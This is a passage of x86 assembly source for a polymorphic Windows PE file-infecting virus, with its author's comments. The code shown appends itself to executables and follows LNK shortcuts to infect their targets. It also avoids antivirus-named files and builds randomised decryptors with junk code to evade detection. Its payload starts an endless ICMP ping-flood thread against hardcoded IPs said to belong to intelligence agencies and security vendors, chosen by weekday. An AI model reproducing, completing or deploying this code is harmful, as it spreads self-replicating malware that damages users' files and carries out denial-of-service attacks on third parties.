 add edx, [esi+14h]        ; edx = Pointer to raw-data

 push edx                  ; save it in stack

 mov eax, ebx
 add eax, [esi+0Ch]        ; make it VA
                           ; this is our new EIP

 mov [edi+28h], eax
 mov dword ptr [ebp+NewEIP], eax

 mov eax, [esi+10h]        ; get size of Raw-data
 push eax
 add eax, dword ptr [ebp+VirLen]
                           ; increase it
 mov ecx, [edi+3Ch]        ; Align it
 
 call Align

                           ; save it in the file as
                           ; new size of rawdata and
 mov [esi+10h], eax

 pop eax                   ; new Virtual size
 add eax, dword ptr [ebp+VirLen]
 add eax, Buffersize
 mov [esi+08h], eax

 pop edx

 mov eax, [esi+10h]
 add eax, [esi+0Ch]        ; New Size of Image
                           ; save it in the file
 mov [edi+50h], eax
                           ; change section flags to make
                           ; us have write & read access to it
                           ; when the infected file is run
                           ; we also set the code flag.. ;)
 or dword ptr [esi+24h], 0A0000020h
                           ; we write our infection mark to the program,
                           ; so we will not infect it twice
                           ; --> DDoS
 mov dword ptr [edi+4Ch], 'SoDD'
 push edi                  ; save them
 push edx

 push 10d
 pop ecx
 call GetRand              ; get random number ( we'll use the EAX value )

 pop edi                   ; restore and xchange
 pop edx

 mov word ptr [ebp+Key], ax
 push eax                  ; save it 2 times

 lea esi, [ebp+Virus]      ; point to start of virus
 add edi, dword ptr [ebp+MapAddress]
 push edi                  ; save edi

 mov ecx, dword ptr [ebp+VirLen]
                           ; get size of virus in ecx
 rep movsb                 ; append virus !

 pop esi                   ; decrypt the virus
 mov edi, esi
 add esi, NoCrypt
 mov ecx, (CryptSize / 2)

 pop edx                   ; get key from stack
 push edi                  ; save start
 mov edi, esi

EnCryptLoop:               ; decrypt with second layer
 lodsw
 not ax
 inc dx
 xchg dl, dh
 xor ax, dx
 xchg al, ah
 stosw
 loop EnCryptLoop


 pop esi                   ; let's start decrypting with the second layer
 add esi, 05h              ; skip the call
 mov ecx, FirstLSize       ; mov size to ecx
 mov edi, esi
 mov edx, dword ptr [ebp+CryptType]
 xor eax, eax 

XorEncrypt:                ; we use a simple xor
 dec edx
 jnz NegEncrypt
 mov dl, byte ptr [ebp+PolyKey]

@Xor:
 lodsb
  xor al, dl
 stosb
 loop @Xor
 jmp EndPolyCrypto

NegEncrypt:
 dec edx
 jnz NotEncrypt
@Neg:
 lodsb
  neg al
 stosb
 loop @Neg
 jmp End2LCrypto

NotEncrypt:                ; not byte ptr [esi]
 dec edx
 jnz IncEncrypt
@Not:
 lodsb
  not al
 stosb
 loop @Not
 jmp End2LCrypto

IncEncrypt:                ; inc byte ptr [esi]
 dec edx
 jnz DecEncrypt
@Inc:
 lodsb
  dec al
 stosb
 loop @Inc
 jmp End2LCrypto

DecEncrypt:                ; dec byte ptr [esi]
 lodsb
  inc al
 stosb
 loop DecEncrypt

End2LCrypto:

 dec byte ptr [ebp+InfCounter]

                           ; if we succesfully received the dll and the
                           ; function, we create a checksum for the
                           ; file ( needed for dll's and WinNT )
 cmp [ebp+XCheckSumMappedFile], 0h
 je NoCRC

 lea esi, [ebp+CheckSum]
 push esi
 lea esi, [ebp+HeaderSum]
 push esi
 push dword ptr [ebp+NewSize]
 push dword ptr [ebp+MapAddress]
 call dword ptr [ebp+XCheckSumMappedFile]

 test eax, eax             ; if this failed we don't save
 jz NoCRC                  ; the crc

 mov eax, dword ptr [ebp+MapAddress]
                           ; eax points to the dos-stub
 mov esi, [eax+3Ch]        ; esi points to PE-Header
 add esi, eax              ; save CRC in header

 mov eax, dword ptr [ebp+CheckSum]
 mov [esi+58h], eax

NoCRC:
 ret
NoEXE:                      ; let's return and close the infected file
                            ; this will also write it to disk !
 stc
ret


; ***************************************************************************
; ------------------------[ Infect an LNK-FILE ]-----------------------------
; ***************************************************************************


InfectLNK:                 ; if we find a link file, we try to find the
                           ; file it points to. If it is a EXE File we are able
                           ; to infect, we do so
                           ; this will not work with NT-LNK-Files, there we will
                           ; receive only the Drive, where the file is located

                           ; ok, if a LNK is bigger than 1 Meg, it is none
                           ; we check .. ;)
 cmp dword ptr [ebp+WFD_nFileSizeLow] , 0400h
 ja NoLNK

                           ; get the start addy in esi, and and the size
 mov esi, dword ptr [ebp+MapAddress]
 mov ecx, dword ptr [ebp+WFD_nFileSizeLow]
 xor edx, edx
 add esi, ecx              ; we start checking at the end of the file
                           ; for a valid filename in it
CheckLoop:
 cmp byte ptr [esi], 3ah   ; we detect a filename by the 2 dots ( 3ah = : )
 jne LNKSearch             ; in the Drive

 inc edx                   ; there are 2 times 2 dots, when checking from
 cmp edx, 2d               ; the end of the LNK, we need the 2.nd
 je PointsDetected

LNKSearch:                 ; go on searching
 dec esi
 loop CheckLoop
                           ; if we end here, we did not find the two dots.. :(
NoLNK:

ret

PointsDetected:            ; we found the drive ( two dots ... *g* )  
                           ; esi points to them, now we need to check
                           ; for the start of the name..

 cmp byte ptr [esi+1], 0h  ; check if we got an entire path or just a 
 je NoLNK                  ; single drive ( may happen in NT / 2k )


PointsDetected2:
 dec esi
 cmp byte ptr [esi], 0h
 je NameDetected

loop PointsDetected2       ; ecx still takes care, that we don't
                           ; search too far..
jmp NoLNK                  ; nothing found ? return..

NameDetected:              ; ok, esi points now to the name of the file
                           ; so we try a FindFileFirst to get the information
                           ; first, we save the information in the WIN32_FIND_DATA
                           ; then we try to find the file.
 inc esi
 push esi                  ; save it

 lea esi, [ebp+WIN32_FIND_DATA]
 lea edi, [ebp+Buffer]     ; save the old WIN32_FIND_DATA
 mov ecx, 337d             ; and some more data
 rep movsb

 lea edi, [ebp+WIN32_FIND_DATA]
 xor eax, eax              ; clean this field
 mov ecx, 337d
 rep stosb 

 pop esi

 call FindFirstFileProc

 inc eax
 jz RestoreLNK             ; If there are no files, we return
 dec eax
                           ; otherwise we save the handle 

                           ; if we went here, we know the file exists
                           ; esi still points to the filename including the
                           ; directory, we save this in the win32_Find_DATA
                           ; field, because the name there contains no path

 lea edi, [ebp+WFD_szFileName]
 mov ecx, 259d             ; we just move 259 Bytes, so there is still a ending
                           ; Zero if the name is longer and we just get a simple error
                           ; and not an SEH or some other shit
 rep movsb
 lea esi, [ebp+WFD_szFileName]
 call InfectFile           ; esi points to the filename again, so we infect it ;)

 push dword ptr [ebp+LNKFindHandle]
 call dword ptr [ebp+XFindClose]

RestoreLNK:
 lea edi, [ebp+WIN32_FIND_DATA]
 lea esi, [ebp+Buffer]     ; restore the old WIN32_FIND_DATA
 mov ecx, 337d             ; and some other data
 rep movsb

 ret                       ; return to find more files

LNKFindHandle dd 0h        ; here we save the search-handle

; ***************************************************************************
; ---------------------[ The evil Part: the Payload ]------------------------
; ***************************************************************************



PayLoad:                   ; here we handle the payload of the virus *eg*

 cmp dword ptr [ebp+W32Handle],0
 jne ExecuteHost

 cmp dword ptr [ebp+XCreateThread],0
 je ExecuteHost            ; we better check this, cause this api does not exist in 2k


 lea eax, [ebp+SystemTime] ; retrieve current date, time,.. whatever
 push eax
 call dword ptr [ebp+XGetSystemTime]

 lea esi, [ebp+wDayOfWeek] ; get the day
 xor eax, eax
 lodsw

 shl eax, 2h               ; multiply with 4
                           ; get Target
 lea esi, [ebp+TargetTable]
 add esi, eax
 lea edi, [ebp+Target_IP]  ; write IP to Destination Address Field
 movsd
                           ; we get a nice target for the payload
                           ; and create a new thread to fulfill it ;)

 push offset threadID      ; here we save the thread ID
 push 0h
 push 0h
 push offset PingFlood     ; here starts the code of the new thread
 push 0h
 push 0h
 call dword ptr [ebp+XCreateThread]

 jmp ExecuteHost           ; we're finished, so we execute the host-file

PingFlood:                 ; this is the thread of the payload !
                           ; here are we doing the really evil thingies ;)
                           ; we will start pinging a server ;P

 lea eax, [ebp+offset WSA_DATA]
 push eax                  ; where is it..
 push 0101h                ; required version
 call dword ptr [ebp+XWSAStartup]

 push 1                    ; We want to use the icmp protocoll
 push 3                    ; SOCK_STREAM
 push 2                    ; Address Format
 call dword ptr [ebp+Xsocket]

 mov dword ptr [ebp+ICMP_Handle], eax

 push 4                    ; set the options ( timeout, not really
                           ; nessecairy in this case *g* )
 lea eax, [ebp+offset Timeout]
 push eax
 push 1006h
 push 0FFFFh
 push eax
 call dword ptr [ebp+Xsetsockopt]

                           ; we need to create a checksum for the packet
 lea esi, [ebp+ICMP_Packet]; nothing serious just some additions

 push 6                    ; we do this for 6 words
 pop ecx                   ; = 12 bytes
 xor edx, edx
 
CreateICMP_CRC:            ; load one
  lodsw
  movzx eax, ax            ; mov it to eax ( clean upper part of eax )
  add edx, eax             ; add it to edx ( we just add them all )
 loop CreateICMP_CRC

 movzx eax, dx             ; add the lower ( dx ) and the upper part of
 shr edx, 16d              ; edx together in eax
 add eax, edx

 movzx edx, ax             ; save ax in edx
 shr eax, 16d              ; mov upper part of eax to ax ( clean upper part )
 add eax, edx              ; add old ax to new ax ( add upper part to lower part )

 not eax                   ; eax = - 1 * ( eax + 1 )
                           ; this is our checksum
 mov word ptr [ebp+ICMP_CRC], ax


 push 16d                  ; get it out, we send our packet !
 lea eax, [ebp+offset Info]
 push eax
 push 0
 push 12d
 lea eax, [ebp+offset ICMP_Packet]
 push eax
 push dword ptr [ebp+ICMP_Handle]
 call dword ptr [ebp+Xsendto]

CloseSocket:               ; close the socket, to stay stable ;)
 push dword ptr [ebp+ICMP_Handle]
 call dword ptr [ebp+Xclosesocket]
 call dword ptr [ebp+XWSACleanup]


jmp PingFlood              ; heh that was fun, let's do it again ;)


Timeout     dd 100000d     ; 10000 ms Timeout ( we don't really care about it *g* )
Info:
            dw 2h
            dw 0h
Target_IP   db 0d, 0d, 0d, 0d
            dd 0h          ; there we will fill in the target ip address ;)
ICMP_Packet db 8h
            db 0h
ICMP_CRC    dw 0h          ; for the CRC Calculation of the ping
            dd 0h
            dd 0h
            dd 0h
ICMP_Handle dd 0h          ; the handle of the open Socket

TargetTable:               ; these are our targets
                           ; please note again, that i don't want to damage one
                           ; of these servers ! I choose them because I think that
                           ; they will stand such an attack if anyone will ever release this
                           ; into the wild !!!

 db  62d, 156d, 146d, 231d ; Sunday    = www.bundesnachrichtendienst.de
 db 195d, 154d, 220d,  34d ; Monday    = French Secret Service ( dgse.citeweb.net )
 db 216d, 122d,   8d, 245d ; Tuesday   = www.avp.com ( AV )
 db 216d,  41d,  20d,  75d ; Wednesday = www.lockdown2000.com
 db 194d, 252d,   6d,  47d ; Thursday  = www.f-secure.com 
 db 208d, 226d, 167d,  23d ; Friday    = www.norton.com
 db 205d, 178d,  21d,   3d ; Saturday  = www.zonelabs.com


; ***************************************************************************
; -------------------------[ Align-Procedure ]-------------------------------
; ***************************************************************************
                           ; lets align the size..
                           ; eax - size
                           ; ecx - base
Align:
 push edx
 xor edx, edx
 push eax
 div ecx
 pop eax
 sub ecx, edx
 add eax, ecx
 pop edx                   ; eax - new size
ret


; ***************************************************************************
; --------------------------[ FindFile Procedures ]--------------------------
; ***************************************************************************


FindFirstFileProc:
 lea eax, [ebp+WIN32_FIND_DATA]
 push eax
 push esi
 call dword ptr [ebp+XFindFirstFileA]
 mov dword ptr [ebp+FindHandle], eax
ret

FindNextFileProc:
 lea edi, [ebp+WFD_szFileName]
 mov ecx, 276d             ; we clear these fields !
 xor eax, eax
 rep stosb
 
 lea eax, [ebp+WIN32_FIND_DATA]
 push eax
 mov eax, dword ptr [ebp+FindHandle]
 push eax
 call dword ptr [ebp+XFindNextFileA]
ret

CheckFileName:
 pushad
 lea esi, [ebp+WFD_szFileName]
 mov edi, esi
 mov ecx, 260d

ConvertLoop:               ; Convert to upper cases
  lodsb
  cmp al, 96d
  jb Convert 
  cmp al, 123d
  ja Convert
  or al, al
  jz EndConvert 
  sub al, 32d
Convert:
  stosb
 loop ConvertLoop

EndConvert:
 lea edi, [ebp+WFD_szFileName]
 lea esi, [ebp+FileNames]
 mov ecx, 3h

FileNameCheck:             ; check for av-names
 push ecx                  ; i don't want to infect them
 mov ecx, 260d

CheckON: 
 lodsb
 repnz scasb
 or ecx, ecx
 jnz AVFile

 pop ecx
 inc esi
loop FileNameCheck

 jmp EndFileNameCheck


AVFile:
 mov al, byte ptr [esi]    ; check if the second char also matches
 cmp byte ptr [edi], al
 je GotAVFile 

 dec esi
 jmp CheckON

GotAVFile:
 pop ecx                   ; clear stack
 popad
 stc                       ; set carriage flag 
 ret

EndFileNameCheck:
 popad
 clc
 ret


 FileNames db 'AV'         ; we avoid these names
           db 'AN'         ; so we will not infect an AV and
           db 'DR'         ; alert the user

;****************************************************************************
; ---------------------[ Checks for PE / MZ Signs ]--------------------------
; ***************************************************************************
                           ; we check here for PE and MZ signs
                           ; to identify the Executable we want to infect
                           ; I do this a little bit different than usual *g*
CheckPESign:
 cmp dword ptr [edi], 'FP' ; check if greater or equal to PF
 jae NoPESign

 cmp dword ptr [edi], 'DP' ; check if lower or equal to PD
 jbe NoPESign
 
 clc                       ; all that's left is PE
 ret
 
NoPESign:
 stc                       ; set carriage flag
 ret

CheckMZSign:
 cmp word ptr [esi], '[M'
 jae NoPESign

 cmp word ptr [esi], 'YM'
 jbe NoPESign

 clc
 ret
ret

; ***************************************************************************
; ----------------[ Generate a pesudo-random Number ]------------------------
; ***************************************************************************

GetRand:
                           ; generate a pseudo-random NR.
                           ; based on some initial registers
 push ecx                  ; and the Windows - Ontime
 add ecx, eax
 call dword ptr [ebp+XGetTickCount]
 add eax, ecx
 add eax, ecx
 add eax, edx
 add eax, edi
 add eax, ebp
 add eax, dword ptr [ebp+PolyLen]
 add eax, dword ptr [ebp+LoopLen]

 sub eax, esi
 sub eax, ebx

 pop ecx
 add eax, ecx

 add al, byte ptr [ebp+Reg1]
 add ah, byte ptr [ebp+Reg2]
 
 or eax, eax
 jne GetOutRand
 mov eax, 87654321h
 inc eax

GetOutRand:
 xor edx, edx              ; clean edx ( needed to be able to divide later )
 div ecx                   ; Random Numer is in EAX
                           ; RND No. 'till ECX in EDX
ret

; ***************************************************************************
; ----------------------[ Generate a Poly Decryptor ]------------------------
; ***************************************************************************


genPoly:
 and dword ptr [ebp+PolyLen], 0h

 push 10h
 pop ecx
 call GetRand              ; get a random number to start
                           ; and save it as the new key used for all files

 mov byte ptr [ebp+PolyKey], al

 call GetRegs

 lea edi, [ebp+PDecrypt]   ; here starts the decryptor

 call RandJunk
                           ; we have 3 different ways to put 
                           ; the size in ecx and 3 different ways
                           ; to get the starting offset in esi
 push 2h                   ; divide by 2
 pop ecx
 call GetRand              ; get a random number to decide what we do
                           ; first
                           ; we need these 2 values before we start the
                           ; decryption loop !

                           ; if edx = 1 we use the second one
 dec edx                   ; chose the Order
 jz SecondOrder
FirstOrder: 
 call GenerateESI          ; esi comes first and ecx follows
 call RandJunk
 call GenerateECX          ; and 4 different ways to get size in exc
 jmp Polypreparefinished   ; so there is nothing static here !

SecondOrder:               ; ecx comes first and esi follows
 call GenerateECX
 call RandJunk
 call GenerateESI

Polypreparefinished:       ; we finished the preparing and can start the loop
                           ; we need a 
                           ; xor byte ptr [esi], key   ( or other crypto )
                           ; inc esi / add esi, 1h
                           ; loop Decryptor / dec ecx , jnz Above ..

                           ; lenght of loop = 0
 and dword ptr [ebp+LoopLen], 0
                           ; now we choose the way we crypt this thing !

 push 5h
 pop ecx
 call GetRand
 mov dword ptr [ebp+CryptType], edx
 
XorDecrypt:                ; we use a simple XOR BYTE PTR [ESI], KEY
 dec edx
 jnz NegDecrypt

 mov ax, 3680h             ; xor byte ptr [esi]
 stosw
 
 mov al, byte ptr [ebp+PolyKey]
 stosb
                           ; increase sizes ( we will add the last 2 bytes later )
 add dword ptr [ebp+LoopLen], 1h
 add dword ptr [ebp+PolyLen], 1h

 jmp EndPolyCrypto

NegDecrypt:                ; neg byte ptr [esi]
 dec edx
 jnz NotDecrypt
 mov ax, 1EF6h
 stosw
 jmp EndPolyCrypto

NotDecrypt:                ; not byte ptr [esi]
 dec edx
 jnz IncDecrypt
 mov ax, 16F6h
 stosw
 jmp EndPolyCrypto

IncDecrypt:                ; inc byte ptr [esi]
 dec edx
 jnz DecDecrypt
 mov ax, 06FEh
 stosw
 jmp EndPolyCrypto

DecDecrypt:                ; dec byte ptr [esi]
 mov ax, 0EFEh
 stosw


EndPolyCrypto:             ; add the last 2 bytes
 add dword ptr [ebp+LoopLen], 2h
 add dword ptr [ebp+PolyLen], 2h

 call RandJunk             ; more junk.. ;)

                           ; now we need to increase esi
                           ; to crypt the next byte
 push 3h
 pop ecx
 call GetRand

IncESI1:
 dec edx
 jnz IncESI2

 mov al, 46h               ; do a simple inc esi
 stosb

 jmp EndIncESI

IncESI2:                   ; add esi, 1h
 dec edx
 jnz IncESI3
 
 mov al, 83h
 stosb
 mov ax, 01C6h
 stosw

 jmp EndIncESI2

IncESI3:                   ; clc, adc esi, 1h

 mov eax, 01d683f8h
 stosd

 add dword ptr [ebp+LoopLen], 1h
 add dword ptr [ebp+PolyLen], 1h

EndIncESI2:
 add dword ptr [ebp+LoopLen], 2h
 add dword ptr [ebp+PolyLen], 2h
 
EndIncESI:
 add dword ptr [ebp+LoopLen], 1h
 add dword ptr [ebp+PolyLen], 1h

 call RandJunk             ; more, and more..

                           ; now esi is incremented and we just have to do
                           ; the loop
 push 3h
 pop ecx
 call GetRand
LoopType1:                 ; we use the most common form : loop ;)
 dec edx
 jnz LoopType2

 mov al, 0e2h
 stosb

 call StoreLoopLen

 jmp EndLoopType

LoopType2:                 ; we do a dec ecx, jnz
 dec edx
 jnz LoopType3
 
 mov ax, 7549h
 stosw                     ; correct Loop Size ( dec ecx = 1 byte )
 add dword ptr [ebp+LoopLen], 1h
 call StoreLoopLen

 add dword ptr [ebp+PolyLen], 1h

 jmp EndLoopType

LoopType3:
 mov eax, 0F98349h          ; dec ecx cmp ecx, 0h
 stosd
 add dword ptr [ebp+LoopLen], 4h
 mov al, 75h                ; jne
 stosb
 add dword ptr [ebp+PolyLen], 3h
 call StoreLoopLen

EndLoopType:
 add dword ptr [ebp+PolyLen], 2h

 mov byte ptr [edi], 0C3h  ; save the ending ret
 add dword ptr [ebp+PolyLen], 2h
 

 mov eax, VirusSize        ; calculate the new size for the virus
 add eax, dword ptr [ebp+PolyLen]
 mov dword ptr [ebp+VirLen], eax

ret

StoreLoopLen:
 xor eax, eax              ; calculate the size for the loop
 mov ax, 100h
 sub eax, dword ptr [ebp+LoopLen]
 sub eax, 2h
 stosb
ret

; ***************************************************************************
; --------------------------[ Insert Junk Code  ]----------------------------
; ***************************************************************************
RandJunk:                  ; edi points to the place where they will be stored
                           ; we will insert 1-8 junk instructions
 push 7d                   ; each time this routine is called
 pop ecx
 call GetRand
 xchg ecx, edx
 inc ecx
 
 push ecx


RandJunkLoop:
 push ecx

 push 8h
 pop ecx
 call GetRand              ; get a random number from 0 to 7
 xchg eax, edx

 lea ebx, [ebp+OpcodeTable]
 xlat                      ; get the choosen opcode
 stosb                     ; and save it to edi
 xor eax, eax              ; clean eax
                           ; get first Register
 mov al, byte ptr [ebp+Reg1]
 shl eax, 3h               ; multiply with 8
 add eax, 0c0h             ; add base
                           ; add the second register
 add al, byte ptr [ebp+Reg2]
 stosb                     ; save opcode

XchangeRegs:               ; we get new ones and exchange them
 Call GetRegs              ; cause the rnd - generator relies on them *g*
 mov al, byte ptr [ebp+Reg1]
 mov ah, byte ptr [ebp+Reg2]
 mov byte ptr [ebp+Reg1], ah
 mov byte ptr [ebp+Reg2], al 


 pop ecx                   ; restore ecx
 loop RandJunkLoop         ; and loop

 pop ecx                   ; we need the additional lenght
 shl ecx, 1                ; multiply with 2 
                           ; save it
 add dword ptr [ebp+LoopLen], ecx
 add dword ptr [ebp+PolyLen], ecx
 

ret

OpcodeTable:
 db 08Bh                   ; mov
 db 033h                   ; xor
 db 00Bh                   ; or
 db 02Bh                   ; sub
 db 003h                   ; add
 db 023h                   ; and
 db 013h                   ; adc
 db 01Bh                   ; sbb


GetRegs:                   ; select two registers to use
                           ; set to Error
 pushad
 mov byte ptr [ebp+Reg1], -1
 mov byte ptr [ebp+Reg2], -1

 lea edi, [ebp+Reg1]
 mov ecx, 2
                           ; now we choose 2 registers we use 

NextReg:                   ; to make the junk code look realistic
 push ecx
 push 8h
 pop ecx
 call GetRand
 pop ecx

 cmp edx, 1h               ; we will not use ECX
 je NextReg
 cmp edx, 4h               ; ESP
 je NextReg
 cmp edx, 6h               ; or ESI, cause these values are important
 je NextReg                ; for the decryptor or the virus to work.
 mov al, dl                ; save it
 stosb
 loop NextReg

 popad
ret

; ***************************************************************************
; -------------------------[ Get esi from stack ]----------------------------
; ***************************************************************************

GenerateESI:
                           ; the first thing we do is to get the 
                           ; start of the crypted code, this is simpel,
                           ; it is our return address, so we get it from
                           ; stack
                           ; there are 3 different ways we can do this
 push 3h
 pop ecx
 call GetRand
 dec edx                   ; which way to we use ?

 jnz ESI2

ESI1:
 lea esi, [ebp+movESI]     ; use the mov esi, [esp] instruction
 movsw                     ; 3 bytes long
 movsb
 add dword ptr [ebp+PolyLen], 3h 

 jmp EndESI                ; get back


ESI2:                      ; we simply pop esi and push it again
 dec edx
 jnz ESI3

 mov al, 5eh               ; pop esi
 stosb
 mov al, 56h
 stosb                     ; push esi
 add dword ptr [ebp+PolyLen],2h
 jmp EndESI


ESI3:
 push 5h
 pop ecx
 call GetRand
 xchg eax, edx
 cmp al, 1h                ; if we got ecx, we use eax
 jne ESI3b
 xor eax, eax

ESI3b:
 mov edx, eax
 push edx                  ; save edx
 add eax, 58h              ; pop a register

 stosb

 pop eax                   ; push the value again
 push eax
 add eax, 50h
 stosb

 mov al, 08bh              ; and finally move it to esi
 stosb
 pop eax
 mov al, 0f0h
 add al, dl
 stosb
 add dword ptr [ebp+PolyLen], 4h

EndESI:
 ret

                           ; code to retrieve the start of crypt-code
 movESI db 8bh, 34h, 24h   ; mov esi, [esp]


; ***************************************************************************
; --------------------------[ Move the size to ECX ]-------------------------
; ***************************************************************************

GenerateECX:               ; here we put the size of the crypted
                           ; part in ecx

 push 3h
 pop ecx
 call GetRand              ; random Nr in edx
 inc edx                   ; increase

ECX1:                      ; use a simple mov
 dec edx
 jnz ECX2

 mov al, 0b9h              ; mov
 call StoreALValue

 jmp EndECX

ECX2:                      ; let's use a push ( value )
 dec edx                   ; pop ecx
 jnz ECX3

 mov al, 068h              ; push
 call StoreALValue
 
 mov al, 59h               ; save the pop ecx
 stosb
 add dword ptr [ebp+PolyLen], 1h

 jmp EndECX

ECX3:
 push -1
 pop ecx
 call GetRand
 mov eax, VirusSize
 shl edx, 26d
 shr edx, 26d
 sub eax, edx

 push eax                  ; mov ecx, Size - X
 mov al, 0b9h
 stosb                     ; and the size we need to decrypt
 pop eax
 stosb
 call StoShrEAX

 mov ax, 0c181h            ; add ecx, X
 stosw
 xor eax, eax
 mov al, dl
 
 stosb
 call StoShrEAX
 add dword ptr [ebp+PolyLen], 11d

 jmp EndECX                ; finish


StoreECX:                  ; save the mov
 push ax                   ; save the register

 mov al, 0b8h              ; save the mov reg, size
 add al, dl
 call StoreALValue

 mov al, 03h               ; add ecx, reg
 stosb
 pop ax                    ; get the chosen register
 add al, 0c8h
 stosb

 add dword ptr [ebp+PolyLen], 4h

 EndECX:                   ; let's return
ret


StoShrEAX:                 ; to save dwords backwards
 push 3
 pop ecx
StoShrEAXLoop:
 shr eax, 8
 stosb
 loop StoShrEAXLoop
ret


StoreALValue:              ; we store the instruction in al
 stosb                     ; and the size we need to decrypt
 mov eax, FirstLSize       ; eax, size
 stosb
 call StoShrEAX

 add dword ptr [ebp+PolyLen], 5h
 add dword ptr [ebp+LoopLen], 5h
ret


; ***************************************************************************
; -------------------[ Data which does not travel ]--------------------------
; ***************************************************************************
VirusEnd:                  ; ok, this data will travel, but will be generated
                           ; new on each run

PDecrypt:                  ; here will we add the polymorphic
                           ; decryption routine later, but not included
                           ; into 1.st generation
 ret                       ; so we just return

 db 150d dup (0h)          ; we keep 150 bytes free, so we have a buffer
                           ; for the poly decryptor



                           ; here we save the data which does not
                           ; travel which each copy of the virus

 PolyKey   db (?)          ; key for the poly decryptor
 PolyLen   dd (?)          ; lenght of decryptor
 VirLen    dd (?)          ; virus lenght + decryptor
 LoopLen   dd (?)          ; lenght of the decryption loop
 CryptType dd (?)          ; we save which kind of encryption we use
 
 Reg1      db (?)          ; here we save the registers we use for the junk
 Reg2      db (?)          ; code

 SEH_Save  dd (?)          ; We save the original SEH

                           ; Handles of the dll's we use
 K32Handle dd (?)          ; Kernel32.dll might be nessecairy *g*
 IHLHandle dd (?)          ; Imagehlp.dll to create checksums
 ADVHandle dd (?)          ; Advapi32.dll for registry access
 W32Handle dd (?)          ; Winsck32.dll for pinging

                           ; The Offsets of the API's we use
 XLoadLibraryA    dd (?)   ; Here we save their Offset
 XGetProcAddress  dd (?)

 XFindFirstFileA       dd (?)
 XFindNextFileA        dd (?)
 XFindClose            dd (?)
 XCreateFileA          dd (?)
 XSetFileAttributesA   dd (?)
 XCloseHandle          dd (?)
 XCreateFileMappingA   dd (?)
 XMapViewOfFile        dd (?)
 XUnmapViewOfFile      dd (?)
 XGetWindowsDirectoryA dd (?)
 XGetSystemDirectoryA  dd (?)
 XGetCurrentDirectoryA dd (?)
 XSetCurrentDirectoryA dd (?)
 XGetFileAttributesA   dd (?)
 XGetTickCount         dd (?)
 XCreateThread         dd (?)
 XGetSystemTime        dd (?)

 XCheckSumMappedFile   dd (?)


 XRegOpenKeyExA        dd (?)
 XRegQueryValueExA     dd (?)
 XRegCloseKey          dd (?)

 Xsocket               dd (?)
 XWSACleanup           dd (?)
 XWSAStartup           dd (?)
 Xclosesocket          dd (?)
 Xsendto               dd (?)
 Xsetsockopt           dd (?)

                           ; Data to search Kernel
 KernelAddy   dd (?)       ; Pointer to kernel PE-Header
 MZAddy       dd (?)       ; Pointer to kernel MZ-Header

 RegHandle    dd (?)       ; Handle to open Reg-Key

                           ; Directory's
 windir  db 7Fh dup (0)    ; here we save the directory's
 curdir  db 7Fh dup (0)    ; we want to infect

                           ; some data for infection
 counter  dw (?)           ; a counter to know how many names we have compared
 ATableVA dd (?)           ; the Address Table VA
 NTableVA dd (?)           ; the Name Pointer Table VA
 OTableVA dd (?)           ; the Name Pointer Table VA

 NewSize   dd (?)          ; we save the new size of the file here
 CheckSum  dd (?)          ; checksum
 HeaderSum dd (?)          ; crc of header

                           ; Data to find files

 WIN32_FIND_DATA         label    byte
 WFD_dwFileAttributes    dd       ?
 WFD_ftCreationTime      FILETIME ?
 WFD_ftLastAccessTime    FILETIME ?
 WFD_ftLastWriteTime     FILETIME ?
 WFD_nFileSizeHigh       dd       ?
 WFD_nFileSizeLow        dd       ?
 WFD_dwReserved0         dd       ?
 WFD_dwReserved1         dd       ?
 WFD_szFileName          db       260d dup (?)
 WFD_szAlternateFileName db       13   dup (?)
 WFD_szAlternateEnding   db       03   dup (?)

 FileHandle              dd       (?)         ; handle of file
 MapHandle               dd       (?)         ; Handle of Map
 MapAddress              dd       (?)         ; offset of Map

 Attributes              dd       (?)         ; saved File-Attributes
 threadID                dd       (?)         ; payload runs in an extra thread
                                              ; we need this buffer for follwing
                                              ; the shortcuts
 Buffer                  db       337d dup (?)
                                              ; this buffer is nessecairy
                                              ; to create a winsock connection ( ping )
 WSA_DATA                db       400d dup (0)

 SystemTime:                                  ; needed to get the current day
  wYear           dw (?)
  wMonth          dw (?)
  wDayOfWeek      dw (?)                      ; Sunday = 0, Monday = 1 .. etc.
  wDay            dw (?)
  wHour           dw (?)
  wMinute         dw (?)
  wSecond         dw (?)
  wMilliseconds   dw (?)


EndBufferData:
; ***************************************************************************
; ------------------------[ That's all folks ]-------------------------------
; ***************************************************************************
end Virus